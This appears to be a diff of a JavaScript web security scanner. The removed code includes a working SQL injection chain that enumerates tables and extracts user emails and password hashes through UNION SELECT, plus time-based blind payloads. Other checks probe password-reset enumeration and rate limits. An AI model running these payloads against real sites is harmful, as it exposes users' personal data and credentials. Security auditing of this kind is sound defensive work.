-        else if (/(?:unterminated quoted string|unclosed quotation mark|syntax error\s+(?:near|at line|at end of input)|SQL syntax;\s+check the manual|SQLSTATE\[\d+\])/i.test(combined)) { sqlVulnerable = true; }
-
-        if (sqlVulnerable) {
-          addFinding('CRITIQUE', 'SQL Injection', `SQL injection confirmed - database: ${dbType}`, `Payload: ${payload} (${name})\nThe server exposes an SQL error. The detected DB type allows crafting specific payloads.`, 'Use prepared statements. Disable error display in production.');
-          break;
-        }
-      }
-
-      if (!sqlVulnerable) {
-        addFinding('INFO', 'SQL Injection', 'No SQL injection detected in phase 1', `${detectionPayloads.length} payloads tested - no SQL error`, '');
-      }
-
-      // ── PHASE 2 : Table enumeration (if vulnerable) ──
-      if (sqlVulnerable) {
-        spinner.text = 'SQL Injection - Phase 2: Table enumeration (read-only)...';
-
-        // Determine the number of columns with ORDER BY
-        let numColumns = 0;
-        for (let i = 1; i <= 20; i++) {
-          const result = await submitPayload(`' ORDER BY ${i}--`);
-          const combined = result.responseText + result.pageContent;
-          if (/order|column|unknown|invalid|error|range/i.test(combined) && !/order by ${i}/i.test(combined)) {
-            numColumns = i - 1;
-            break;
-          }
-        }
-
-        if (numColumns > 0) {
-          addFinding('CRITIQUE', 'SQL Injection', `Number of columns in the query: ${numColumns}`, `Detected via ORDER BY. This allows building UNION SELECT statements to extract data.`, '');
-        }
-
-        // Try UNION SELECT to read tables
-        const tableEnumPayloads = {
-          postgresql: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "string_agg(table_name,',')" : 'NULL').join(',') : "string_agg(table_name,',')"} FROM information_schema.tables WHERE table_schema='public'--`,
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "table_name" : 'NULL').join(',') : 'table_name'} FROM information_schema.tables WHERE table_schema='public' LIMIT 1--`,
-          ],
-          mysql: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(table_name)" : 'NULL').join(',') : "GROUP_CONCAT(table_name)"} FROM information_schema.tables WHERE table_schema=database()--`,
-          ],
-          sqlite: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(name)" : 'NULL').join(',') : "GROUP_CONCAT(name)"} FROM sqlite_master WHERE type='table'--`,
-          ],
-          unknown: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "table_name" : 'NULL').join(',') : 'table_name'} FROM information_schema.tables--`,
-          ],
-        };
-
-        const payloadsToTry = tableEnumPayloads[dbType] || tableEnumPayloads.unknown;
-
-        for (const payload of payloadsToTry) {
-          const result = await submitPayload(payload);
-          const combined = result.responseText + result.pageContent;
-
-          // Look for table names in the response
-          const tablePatterns = /\b(users|accounts|profiles|sessions|tokens|orders|products|payments|invoices|clients|workspaces|members|subscriptions|emails|passwords|admins|roles|permissions)\b/gi;
-          const tablesFound = combined.match(tablePatterns);
-
-          if (tablesFound) {
-            const uniqueTables = [...new Set(tablesFound.map(t => t.toLowerCase()))];
-            addFinding('CRITIQUE', 'SQL Injection', `Database tables extracted via UNION`, `Payload: ${payload}\nTables found: ${uniqueTables.join(', ')}\nAn attacker can now read the contents of each table.`, 'URGENCY: Fix the SQL injection immediately. All database data is potentially compromised.');
-            break;
-          }
-        }
-
-        // ── PHASE 3 : Attempt to read users ──
-        spinner.text = 'SQL Injection - Phase 3: Attempting to read users...';
-
-        const userReadPayloads = {
-          postgresql: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : (i === 1 ? "role" : 'NULL')).join(',') : 'email'} FROM users LIMIT 5--`,
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : (i === 1 ? "role" : 'NULL')).join(',') : 'email'} FROM auth.users LIMIT 5--`,
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "string_agg(email,',')" : 'NULL').join(',') : "string_agg(email,',')"} FROM users--`,
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "count(*)" : 'NULL').join(',') : "count(*)"} FROM users--`,
-          ],
-          mysql: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(email)" : 'NULL').join(',') : "GROUP_CONCAT(email)"} FROM users--`,
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "COUNT(*)" : 'NULL').join(',') : "COUNT(*)"} FROM users--`,
-          ],
-          sqlite: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "GROUP_CONCAT(email)" : 'NULL').join(',') : "GROUP_CONCAT(email)"} FROM users--`,
-          ],
-          unknown: [
-            `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? "email" : 'NULL').join(',') : 'email'} FROM users LIMIT 5--`,
-          ],
-        };
-
-        const userPayloads = userReadPayloads[dbType] || userReadPayloads.unknown;
-
-        // Get the baseline (page content with a normal failed login)
-        // to compare and only keep what is NEW in the injection response
-        const baselineResult = await submitPayload('baseline-test@nonexistent.com');
-        const baselineContent = baselineResult.responseText + baselineResult.pageContent;
-        const baselineEmails = new Set((baselineContent.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || []));
-        const baselineHashes = new Set((baselineContent.match(/(\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}|\$argon2[id]{1,2}\$[^\s"'<]+|[a-f0-9]{64}|[a-f0-9]{32})/g) || []));
-
-        for (const payload of userPayloads) {
-          const result = await submitPayload(payload);
-          const combined = result.responseText + result.pageContent;
-
-          // Look for emails in the response
-          const emailPattern = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-          const emailsFound = combined.match(emailPattern);
-
-          if (emailsFound) {
-            // Filter: test emails, emails already in the baseline, Sentry DSN, generic emails
-            const realEmails = emailsFound.filter(e =>
-              !baselineEmails.has(e) &&
-              !e.includes('vice-audit') &&
-              !e.includes('test.local') &&
-              !e.includes('sentry.io') &&
-              !e.includes('ingest.') &&
-              !e.includes('example.com') &&
-              !e.includes('placeholder') &&
-              !e.includes('googletagmanager') &&
-              !e.includes('googleapis')
-            );
-            if (realEmails.length > 0) {
-              addFinding('CRITIQUE', 'SQL Injection', `USER EMAILS EXTRACTED FROM THE DATABASE`, `Payload: ${payload}\nEmails found: ${realEmails.join(', ')}\nThese emails are NEW (not present on the normal page) = they come from the database.`, 'ABSOLUTE URGENCY: The SQL injection allows reading user data. Fix immediately and consider the data compromised. Notify users if necessary (GDPR).');
-              break;
-            }
-          }
-
-          // Look for a number (count)
-          const countMatch = combined.match(/\b(\d{1,6})\b/);
-          if (countMatch && payload.includes('count') && parseInt(countMatch[1]) > 0) {
-            // Verify this number is not in the baseline
-            if (!baselineContent.includes(countMatch[0])) {
-              addFinding('CRITIQUE', 'SQL Injection', `Number of users in the database: ${countMatch[1]}`, `Payload: ${payload}\nThe database contains ${countMatch[1]} user(s). An attacker can extract all of them.`, 'The SQL injection allows counting and potentially extracting all users.');
-            }
-          }
-        }
-
-        // ── PHASE 4 : Attempt to read passwords ──
-        spinner.text = 'SQL Injection - Phase 4: Checking password exposure...';
-
-        const passColumns = ['password', 'encrypted_password', 'password_hash', 'hash', 'passwd', 'pass', 'pwd'];
-        for (const col of passColumns) {
-          const payload = dbType === 'postgresql'
-            ? `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? col : 'NULL').join(',') : col} FROM users LIMIT 1--`
-            : `' UNION SELECT ${numColumns > 0 ? Array(numColumns).fill('NULL').map((v, i) => i === 0 ? col : 'NULL').join(',') : col} FROM users LIMIT 1--`;
-
-          const result = await submitPayload(payload);
-          const combined = result.responseText + result.pageContent;
-
-          // Look for bcrypt, argon2, sha256, md5 hashes
-          const hashPatterns = /(\$2[aby]?\$\d{2}\$[./A-Za-z0-9]{53}|\$argon2[id]{1,2}\$[^\s"'<]+|[a-f0-9]{64}|[a-f0-9]{32})/g;
-          const hashesFound = combined.match(hashPatterns);
-
-          if (hashesFound) {
-            // Filter hashes already present in the baseline (Sentry DSN, etc.)
-            const newHashes = hashesFound.filter(h => !baselineHashes.has(h));
-            if (newHashes.length > 0) {
-              addFinding('CRITIQUE', 'SQL Injection', `PASSWORD HASH EXTRACTED via column "${col}"`, `Payload: ${payload}\nNEW hash(es) (not on the normal page): ${newHashes.slice(0, 3).join(', ')}\nLikely type: ${newHashes[0].startsWith('$2') ? 'bcrypt' : newHashes[0].startsWith('$argon') ? 'argon2' : newHashes[0].length === 64 ? 'SHA-256' : 'MD5/other'}\nAn attacker can attempt to crack these hashes offline with hashcat/john.`, 'ABSOLUTE URGENCY: Passwords are compromised. Force a reset of all user passwords. Fix the SQL injection. If hashes are MD5/SHA, migrate to bcrypt/argon2.');
-              break;
-            }
-          }
-        }
-
-        // ── PHASE 5 : Blind SQL injection (timing-based) ──
-        spinner.text = 'SQL Injection - Phase 5: Blind injection test (timing)...';
-        {
-          const sleepPayloads = {
-            postgresql: "' AND pg_sleep(2)--",
-            mysql: "' AND SLEEP(2)--",
-            unknown: "' AND SLEEP(2)--",
-          };
-
-          const sleepPayload = sleepPayloads[dbType];
-          if (sleepPayload) {
-            const measure = async (payload) => {
-              const startedAt = performance.now();
-              await submitPayload(payload);
-              return performance.now() - startedAt;
-            };
-            const controlSamples = [];
-            const attackSamples = [];
-            for (let i = 0; i < 3; i++) controlSamples.push(await measure('test@test.com'));
-            for (let i = 0; i < 2; i++) attackSamples.push(await measure(sleepPayload));
-            const timing = classifyTimingSamples(controlSamples, attackSamples, 2000);
-
-            if (timing) {
-              addFinding('CRITIQUE', 'SQL Injection', 'Blind SQL Injection confirmed (time-based)', `Payload: ${sleepPayload}\nControl median: ${timing.controlMedian}ms\nPayload median: ${timing.attackMedian}ms\nRepeated difference: ${timing.difference}ms`, 'Use parameterized queries and retest after remediation.');
-            }
-          }
-        }
-      }
-    }
-  }
-
-  // ── CHECK 9 : Forgot password security ──
-  spinner.text = 'Searching for forgot password page...';
-  {
-    const resetPaths = ['/forgot-password', '/auth/forgot-password', '/reset-password', '/auth/reset-password', '/password/reset', '/forgot', '/auth/forgot'];
-    let resetUrl = null;
-
-    // Look for a link on the login page
-    const resetLink = await page.evaluate(() => {
-      const links = [...document.querySelectorAll('a')];
-      const resetLink = links.find(a => /forgot|oubli|reset|reinitialiser|lost/i.test(a.textContent) || /forgot|reset|password/i.test(a.href));
-      return resetLink ? resetLink.href : null;
-    });
-
-    if (resetLink) {
-      resetUrl = resetLink;
-    } else {
-      for (const path of resetPaths) {
-        const testUrl = new URL(baseUrl).origin + path;
-        const res = await safeFetch(testUrl);
-        if (res && res.status === 200) {
-          const body = await res.text();
-          if (/email|reset|reinitialiser|envoyer|send/i.test(body)) {
-            resetUrl = testUrl;
-            break;
-          }
-        }
-      }
-    }
-
-    if (resetUrl) {
-      addFinding('INFO', 'Login Audit', `Password reset page found: ${resetUrl}`, '', '');
-
-      // Test enumeration via the reset page
-      await page.goto(resetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-      await new Promise(r => setTimeout(r, 1500));
-
-      const resetForm = await page.evaluate(() => {
-        const forms = [...document.querySelectorAll('form')];
-        const form = forms.find(f => f.querySelector('input[type="email"], input[name*="email"]'));
-        if (!form) return null;
-        const emailInput = form.querySelector('input[type="email"], input[name*="email"]');
-        return { emailSelector: emailInput ? (emailInput.name ? `[name="${emailInput.name}"]` : 'input[type="email"]') : null };
-      });
-
-      if (resetForm && resetForm.emailSelector) {
-        // Test with a fake email
-        try {
-          await page.click(resetForm.emailSelector).catch(() => {});
-          await page.type(resetForm.emailSelector, 'nonexistent-vice-audit@test.local', { delay: 30 });
-          await page.keyboard.press('Enter');
-          await new Promise(r => setTimeout(r, 3000));
-
-          const resetResponse = await page.evaluate(() => document.body.innerText);
-          if (/not found|n'existe pas|no account|introuvable|unknown/i.test(resetResponse)) {
-            addFinding('ELEVEE', 'Login Audit', 'Enumeration possible via forgot password', `The reset page reveals whether an email is registered or not.\nResponse: "${resetResponse.substring(0, 200)}"`, 'Always respond "If this email is registered, a reset link has been sent" - even if the email does not exist.');
-          }
-        } catch {}
-
-        // Test rate limiting on reset
-        spinner.text = 'Testing rate limiting on password reset...';
-        let resetBlocked = false;
-        const resetRateSamples = [];
-        for (let i = 0; i < 5; i++) {
-          await page.goto(resetUrl, { waitUntil: 'networkidle2', timeout: 10000 });
-          await new Promise(r => setTimeout(r, 1000));
-          try {
-            await page.click(resetForm.emailSelector).catch(() => {});
-            await page.type(resetForm.emailSelector, 'reset-probe@vice-audit.test', { delay: 20 });
-            await page.keyboard.press('Enter');
-            await new Promise(r => setTimeout(r, 1500));
-            const content = await page.evaluate(() => document.body.innerText);
-            resetRateSamples.push({ body: content });
-            if (classifyRateLimitEvidence(resetRateSamples).state === 'enforced') {
-              resetBlocked = true;
-              break;
-            }
-          } catch {}
-        }
-
-        if (!resetBlocked) {
-          addFinding('INFO', 'Login Audit', 'Password reset rate limiting not confirmed', '5 reset attempts against the same synthetic identity did not trigger a visible block. This short browser probe cannot prove that no server-side or upstream limit exists.', 'Review reset telemetry and verify the configured per-account and per-IP thresholds.', { classification: 'heuristic', confidence: 'low' });
-        } else {
-          const evidence = classifyRateLimitEvidence(resetRateSamples);
-          addFinding('INFO', 'Login Audit', 'Rate limiting active on password reset', `A blocking signal appeared after ${evidence.attempt || resetRateSamples.length} attempt(s).`, '');
-        }
-      }
-    }
-  }
-
+  const loginResult = await auditLoginForm(page, loginProbe, addFinding);
+  recordAuditCheck(getScanContext(), 'login', loginResult.outcome);
+  if (loginResult.outcome === 'unknown') getScanContext()?.limitations.add('login_submission_unobserved');
   await browser.close();
 }
 
@@ -2603,13 +1830,10 @@ const STACK_SIGNATURES = {
   'Clerk':         { html: [/clerk/i], headers: [], js: [/clerk\.com/, /@clerk/] },
 
   // Analytics / Tracking
-  'Google Analytics': { html: [/google-analytics/, /gtag/, /googletagmanager/], headers: [], js: [/google-analytics/, /gtag\(/] },
   'Hotjar':          { html: [/hotjar/i], headers: [], js: [/hotjar/] },
   'Sentry':          { html: [/sentry/i], headers: ['x-sentry-rate-limits'], js: [/sentry\.io/, /@sentry/] },
   'Mixpanel':        { html: [/mixpanel/i], headers: [], js: [/mixpanel/] },
-  'Segment':         { html: [/segment/i, /analytics\.js/], headers: [], js: [/segment\.com/, /analytics\.track/] },
   'Intercom':        { html: [/intercom/i], headers: [], js: [/intercom/i, /widget\.intercom/] },
-  'Crisp':           { html: [/crisp/i], headers: [], js: [/crisp\.chat/, /\$crisp/] },
 
   // Bundlers / Build tools
   'Webpack':       { html: [], headers: [], js: [/webpackChunk/, /__webpack_require__/, /webpack/] },
@@ -2640,6 +1864,11 @@ async function detectStack(baseUrl, jsContents, spinner) {
 
   const html = await res.text();
 
+  const sourceRecords = getScanContext()?.stackSources || [];
+  for (const [name, evidence] of detectAnalyticsStack({ html, baseUrl: res.url || baseUrl, sources: sourceRecords })) {
+    detected.set(name, evidence);
+  }
+
   for (const [techName, signatures] of Object.entries(STACK_SIGNATURES)) {
     const sources = [];
     const seenSources = new Set();
@@ -2665,7 +1894,7 @@ async function detectStack(baseUrl, jsContents, spinner) {
     for (const htmlPattern of signatures.html) {
       if (htmlPattern.test(html)) {
         const match = html.match(htmlPattern);
-        if (match) sources.push(`HTML: "${match[0].substring(0, 80)}"`);
+        if (match) sources.push(`${stackSourceLocation({ content: html, url: res.url || baseUrl, kind: 'HTML' }, match.index)}: signature /${htmlPattern.source}/`);
       }
     }
 
@@ -2675,7 +1904,8 @@ async function detectStack(baseUrl, jsContents, spinner) {
         if (jsPattern.test(js)) {
           const match = js.match(jsPattern);
           if (match) {
-            sources.push(`JS bundle: "${match[0].substring(0, 80)}"`);
+            const record = sourceRecords.find(source => source.content === js);
+            sources.push(`${stackSourceLocation(record || { content: js, url: baseUrl, kind: 'JS bundle (location unavailable)' }, match.index)}: signature /${jsPattern.source}/`);
             break; // One match per pattern is enough
           }
         }
@@ -2692,6 +1922,8 @@ async function detectStack(baseUrl, jsContents, spinner) {
     return;
   }
 
+  getScanContext().technologies = [...detected.keys()];
+
   // Classify detections
   const categories = {
     'Servers & Infra': ['Nginx', 'Apache', 'Caddy', 'Vercel', 'Netlify', 'Cloudflare', 'AWS', 'Google Cloud', 'OVHcloud', 'Heroku'],
@@ -2699,7 +1931,7 @@ async function detectStack(baseUrl, jsContents, spinner) {
     'Backend': ['Express', 'PHP', 'Django', 'Ruby on Rails', 'Laravel'],
     'CMS': ['WordPress', 'Shopify', 'Webflow'],
     'BaaS & Services': ['Supabase', 'Firebase', 'Stripe', 'Auth0', 'Clerk'],
-    'Analytics & Tracking': ['Google Analytics', 'Hotjar', 'Sentry', 'Mixpanel', 'Segment', 'Intercom', 'Crisp'],
+    'Analytics & Tracking': ['Google Analytics', 'Google Tag Manager', 'Hotjar', 'Sentry', 'Mixpanel', 'Segment', 'Intercom', 'Crisp'],
     'Build Tools': ['Webpack', 'Vite', 'Turbopack'],
     'UI': ['Tailwind CSS', 'Bootstrap', 'Material UI', 'Shadcn/UI'],
   };
@@ -2851,6 +2083,7 @@ async function scanSubdomains(baseUrl, spinner) {
   const dns = await import('dns');
   const { promisify } = await import('util');
   const resolve4 = promisify(dns.default.resolve4);
+  const resolve6 = promisify(dns.default.resolve6);
 
   let wildcardAddresses = null;
   try {
@@ -2869,7 +2102,8 @@ async function scanSubdomains(baseUrl, spinner) {
   const resolvedCandidates = await mapWithConcurrency(candidateList, 20, async (subdomain, index) => {
     if ((index + 1) % 10 === 0) spinner.text = `Subdomain DNS check [${index + 1}/${total}] ${subdomain}...`;
     try {
-      const ips = await resolve4(subdomain);
+      const resolutions = await Promise.allSettled([resolve4(subdomain), resolve6(subdomain)]);
+      const ips = resolutions.flatMap(result => result.status === 'fulfilled' ? result.value : []);
       if (ips && ips.length > 0) {
         const normalizedIps = [...new Set(ips)].sort();
         if (
@@ -2883,6 +2117,7 @@ async function scanSubdomains(baseUrl, spinner) {
     return null;
   });
   const foundSubs = resolvedCandidates.filter(Boolean);
+  getScanContext().subdomains = foundSubs.map(entry => entry.subdomain);
 
   if (foundSubs.length === 0) {
     addFinding('INFO', 'Subdomains', 'No subdomain found', `${total} candidate(s) tested (${crtCount} from crt.sh, ${commonSubs.length} common prefixes).${wildcardAddresses ? ' Wildcard DNS responses were excluded.' : ''}`, '');
@@ -2948,12 +2183,14 @@ async function auditDns(baseUrl, spinner) {
   spinner.text = 'Checking SPF...';
   let spfFound = false;
   let spfLookupConclusive = false;
+  let spfOutcome = dnsPolicyOutcome('spf', baseDomain, null);
   try {
     const txtRecords = await resolveTxt(baseDomain);
+    spfOutcome = dnsPolicyOutcome('spf', baseDomain, txtRecords);
     spfLookupConclusive = true;
     for (const record of txtRecords) {
       const txt = record.join('');
-      if (txt.includes('v=spf1')) {
+      if (/^v=spf1(?:\s|$)/i.test(txt.trim())) {
         spfFound = true;
         if (txt.includes('+all')) {
           addFinding('CRITIQUE', 'DNS / Email', 'SPF with +all - anyone can send emails on your behalf', `SPF: ${txt}`, 'Change +all to ~all or -all in the SPF record');
@@ -2971,39 +2208,47 @@ async function auditDns(baseUrl, spinner) {
     }
   } catch (error) {
     spfLookupConclusive = isDnsAbsence(error);
+    spfOutcome = dnsPolicyOutcome('spf', baseDomain, null, error);
   }
 
   if (spfLookupConclusive && !spfFound) {
-    addFinding('MOYENNE', 'DNS / Email', 'No SPF record found', `The domain ${baseDomain} has no SPF record.\nSpoofed messages using @${baseDomain} are not rejected by an SPF policy.`, `Publish an SPF policy adapted to the actual sending providers, or v=spf1 -all when this domain never sends email.`, { classification: 'confirmed', confidence: 'high' });
+    addFinding('MOYENNE', 'DNS / Email', 'No SPF record found', `The domain ${baseDomain} has no SPF record.\nSpoofed messages using @${baseDomain} are not rejected by an SPF policy.`, `Publish an SPF policy adapted to the actual sending providers, or v=spf1 -all when this domain never sends email.`, { classification: 'confirmed', confidence: 'high', check_key: spfOutcome.key });
   }
 
   // ── DMARC (check _dmarc subdomain) ──
   spinner.text = 'Checking DMARC...';
   let dmarcFound = false;
   let dmarcLookupConclusive = false;
+  let dmarcOutcome = dnsPolicyOutcome('dmarc', baseDomain, null);
   try {
-    const dmarcRecords = await resolveTxt(`_dmarc.${baseDomain}`);
+    const discoveredDmarc = await lookupDmarc(baseDomain, resolveTxt);
+    const dmarcRecords = discoveredDmarc.records;
+    const effectiveDmarc = discoveredDmarc.effective;
+    dmarcOutcome = effectiveDmarc ? dnsPolicyOutcome('dmarc', baseDomain, [[`v=DMARC1; p=${effectiveDmarc}`]]) : dnsPolicyOutcome('dmarc', baseDomain, dmarcRecords);
+    if (dmarcRecords.length && !effectiveDmarc) dmarcOutcome.outcome = 'unknown';
     dmarcLookupConclusive = true;
     for (const record of dmarcRecords) {
       const txt = record.join('');
-      if (txt.includes('v=DMARC1')) {
+      if (/^v=DMARC1\s*;/i.test(txt.trim())) {
         dmarcFound = true;
-        if (txt.includes('p=none')) {
+        if (effectiveDmarc === 'none') {
           addFinding('MOYENNE', 'DNS / Email', 'DMARC in "none" mode - no blocking', `DMARC: ${txt}\nSpoofed emails are reported but not blocked.`, 'Switch to p=quarantine or p=reject after an observation period');
-        } else if (txt.includes('p=quarantine')) {
+        } else if (effectiveDmarc === 'quarantine') {
           addFinding('INFO', 'DNS / Email', 'DMARC in "quarantine" mode', `DMARC: ${txt}`, 'Consider switching to p=reject for maximum protection');
-        } else if (txt.includes('p=reject')) {
+        } else if (effectiveDmarc === 'reject') {
           addFinding('INFO', 'DNS / Email', 'DMARC in "reject" mode - maximum protection', `DMARC: ${txt}`, '');
         }
       }
     }
   } catch (error) {
     dmarcLookupConclusive = isDnsAbsence(error);
+    dmarcOutcome = dnsPolicyOutcome('dmarc', baseDomain, null, error);
   }
 
   if (dmarcLookupConclusive && !dmarcFound) {
-    addFinding('MOYENNE', 'DNS / Email', 'No DMARC record found', `No DMARC policy is published on _dmarc.${baseDomain}.\nReceiving providers have no domain policy for handling spoofed messages.`, `Publish DMARC in monitoring mode first, then move to quarantine or reject after validating legitimate senders.`, { classification: 'confirmed', confidence: 'high' });
+    addFinding('MOYENNE', 'DNS / Email', 'No DMARC record found', `No DMARC policy is published on _dmarc.${baseDomain}.\nReceiving providers have no domain policy for handling spoofed messages.`, `Publish DMARC in monitoring mode first, then move to quarantine or reject after validating legitimate senders.`, { classification: 'confirmed', confidence: 'high', check_key: dmarcOutcome.key });
   }
+  getScanContext()?.checkOutcomes.push(spfOutcome, dmarcOutcome);
 
   // ── DKIM ──
   spinner.text = 'Checking DKIM...';
@@ -3053,10 +2298,11 @@ async function auditDns(baseUrl, spinner) {
   // Cloudflare Pages targets, GitHub Pages, etc.) intentionally don't serve HTTP.
   spinner.text = 'Checking for dangling CNAMEs...';
   const resolveAny = promisify(dns.default.resolve);
-  const subsToCcheck = ['www', 'api', 'app', 'cdn', 'mail', 'staging', 'dev'];
+  const subsToCcheck = [...new Set([...(getScanContext()?.subdomains || []), 'www', 'api', 'app', 'cdn', 'mail', 'staging', 'dev'])].slice(0, 30);
   for (const sub of subsToCcheck) {
     try {
-      const cnames = await resolveCname(`${sub}.${baseDomain}`);
+      const hostname = sub.endsWith(`.${baseDomain}`) ? sub : `${sub}.${baseDomain}`;
+      const cnames = await resolveCname(hostname);
       for (const cname of cnames) {
         // Try to resolve the CNAME target to A/AAAA records.
         // ENOTFOUND / NXDOMAIN means the domain is unregistered = dangling.
@@ -3069,7 +2315,7 @@ async function auditDns(baseUrl, spinner) {
           }
         }
         if (!domainResolves) {
-          addFinding('ELEVEE', 'DNS / Email', `Dangling CNAME detected: ${sub}.${baseDomain}`, `CNAME points to ${cname} which does not resolve (NXDOMAIN).\nAn attacker can register this domain and take over the subdomain (subdomain takeover).`, `Remove the CNAME ${sub}.${baseDomain} → ${cname} or configure the destination`);
+          addFinding('MOYENNE', 'DNS / Email', `Unresolved CNAME target: ${hostname}`, `CNAME points to ${cname} which does not resolve (NXDOMAIN).\nNXDOMAIN confirms a broken destination, but does not establish that another party can claim it.`, `Remove the CNAME ${sub}.${baseDomain} → ${cname} or configure the destination`);
         }
       }
     } catch {}
@@ -3195,13 +2441,18 @@ async function enumerateOpenApiEndpoints(specUrl, specBody, baseUrl, spinner) {
   for (const [pathKey, methods] of targeted) {
     if (typeof methods !== 'object' || methods === null) continue;
     // Skip parameterized paths - we don't have valid ids to fill in
-    if (/\{[^}]+\}/.test(pathKey)) continue;
+    const inventory = getScanContext()?.surfaces;
+    const resolvedPath = pathKey.replace(/\{([^}]+)\}/g, (match, name) => {
+      const value = inventory?.parameterValues.get(name)?.values().next().value;
+      return value === undefined ? match : encodeURIComponent(value);
+    });
+    if (/\{[^}]+\}/.test(resolvedPath)) continue;
 
     if (typeof methods.get !== 'object') continue;
     probed++;
     spinner.text = `OpenAPI probe [${probed}/${targeted.length}] GET ${pathKey}...`;
 
-    const fullUrl = apiBase + pathKey;
+    const fullUrl = apiBase + resolvedPath;
     if (!await authorizeDiscoveredDestination(fullUrl)) continue;
     const res = await safeFetch(fullUrl);
     if (!res || res.status !== 200) continue;
@@ -3235,12 +2486,18 @@ async function enumerateOpenApiEndpoints(specUrl, specBody, baseUrl, spinner) {
 }
 
 async function auditApiEndpoints(baseUrl, jsContents, spinner) {
+  await auditObservedQueries(getScanContext()?.surfaces, safeFetch, addFinding);
+  if (!getScanContext().inputParametersAudited) {
+    getScanContext().inputParametersAudited = true;
+    await auditInputParameters({ inventory: getScanContext()?.surfaces, baseUrl, fetch: safeFetch, finding: addFinding, outcome: state => recordAuditCheck(getScanContext(), 'inputs', state) });
+  }
   // Extract API endpoints from JS
   const apiPatterns = /(?:https?:\/\/[^\s"'`]+\/api\/[^\s"'`]*|\/api\/[a-zA-Z0-9\/_\-]+)/g;
   const origin = new URL(baseUrl).origin;
   const commonApis = ['/api', '/api/v1', '/api/v2', '/api/users', '/api/auth', '/api/admin', '/api/config',
     '/api/health', '/api/status', '/api/debug', '/api/graphql', '/graphql', '/api/docs', '/api/swagger'];
-  const apiEndpoints = new Set(commonApis.map(path => origin + path));
+  const observedRequests = [...(getScanContext()?.surfaces?.requests.values() || [])].filter(request => request.method === 'GET' && /json/i.test(request.contentType));
+  const apiEndpoints = new Set([...observedRequests.map(request => request.url), ...commonApis.map(path => origin + path)]);
   const baselineResponses = [];
 
   for (const baselineUrl of [baseUrl, `${origin}/vice-api-probe-not-found-${Date.now()}`]) {
@@ -3346,24 +2603,6 @@ async function auditApiEndpoints(baseUrl, jsContents, spinner) {
       }
     }
 
-    // ── Test 4 : Parameter injection (only against same-origin endpoints) ──
-    // We never pen-test third-party APIs (Google Maps, Stripe, etc.) - their
-    // documentation pages contain words like "query" that would false-positive.
-    const sqlRes = await safeFetch(`${endpoint}?id=' OR '1'='1&q=' UNION SELECT 1--`, {
-      headers: { 'Content-Type': 'application/json' },
-    });
-    if (sqlRes) {
-      let sqlBody = '';
-      try { sqlBody = await sqlRes.text(); } catch {}
-      if (isLikelyCatchAll(responseSnapshot(sqlRes.status, sqlRes.headers.get('content-type'), sqlBody), baselineResponses)) continue;
-      // Use specific SQL error signatures rather than the bare word "sql" or
-      // "query" (which match any documentation page or generic error text).
-      const sqlErrorRegex = /(?:You have an error in your SQL syntax|Warning:\s+mysqli?_|near\s+'[^']*'\s+at line\s+\d+|Unknown column\s+'[^']+'|MySQLSyntaxErrorException|pq:\s+ERROR|ERROR:.*?at character\s+\d+|LINE\s+\d+:\s|unterminated quoted string at or near|relation\s+"[^"]+"\s+does not exist|column\s+"[^"]+"\s+does not exist|syntax error at or near\s+"|sqlite3?\.OperationalError|near\s+"[^"]+":\s+syntax error|unrecognized token:|no such table:|no such column:|ORA-\d{5}|microsoft (?:sql|ole db|odbc)|sqlclient|system\.data\.sqlclient|SQLSTATE\[\d+\])/i;
-      if (sqlErrorRegex.test(sqlBody)) {
-        addFinding('CRITIQUE', 'API Audit', `Possible SQL injection on ${endpoint}`, 'The server returns a SQL error when payloads are injected into parameters', 'Use prepared queries on all API endpoints');
-      }
-    }
-
     // ── Test 5 : CORS on API endpoint ──
     const corsRes = await safeFetch(endpoint, { headers: { 'Origin': 'https://evil.com' } });
     if (corsRes) {
@@ -3424,24 +2663,7 @@ async function auditStorage(jsContents, spinner) {
     }
   }
 
-  // Find the Supabase URL to test buckets
-  let supabaseUrl = null;
-  for (const js of jsContents) {
-    const urlMatch = js.match(/https?:\/\/[a-z0-9\-]+\.supabase\.co/i);
-    if (urlMatch) { supabaseUrl = urlMatch[0]; break; }
-  }
-
-  // Find the anon key
-  let anonKey = null;
-  for (const js of jsContents) {
-    const keyMatch = js.match(/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/);
-    if (keyMatch) {
-      try {
-        const payload = JSON.parse(Buffer.from(keyMatch[0].split('.')[1], 'base64url').toString());
-        if (payload.role === 'anon') { anonKey = keyMatch[0]; break; }
-      } catch {}
-    }
-  }
+  let { url: supabaseUrl, key: anonKey } = discoverSupabase(jsContents);
 
   // Bucket names that are typically public by convention (avatars, public assets, etc.).
   // Listing these is expected and should be reported at INFO, not MOYENNE.
